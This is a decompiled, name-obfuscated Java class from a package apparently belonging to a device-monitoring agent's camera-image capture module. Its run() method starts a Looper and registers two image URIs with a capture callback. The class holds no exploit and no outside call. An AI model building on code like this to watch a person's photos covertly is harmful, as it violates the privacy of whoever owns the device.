package com.vvt.capture.camera.image.b;

import android.net.Uri;
import android.os.Looper;
import com.vvt.base.capture.i;

class d
  implements Runnable
{
  d(c paramc, i parami) {}
  
  public void run()
  {
    Looper.prepare();
    c localc = this.b;
    Object localObject = Looper.myLooper();
    c.a(localc, (Looper)localObject);
    boolean bool = c.a();
    if (bool) {}
    localc = this.b;
    localObject = a.a;
    i locali = this.a;
    c.a(localc, (Uri)localObject, locali);
    localc = this.b;
    localObject = a.b;
    locali = this.a;
    c.a(localc, (Uri)localObject, locali);
    Looper.loop();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/camera/image/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */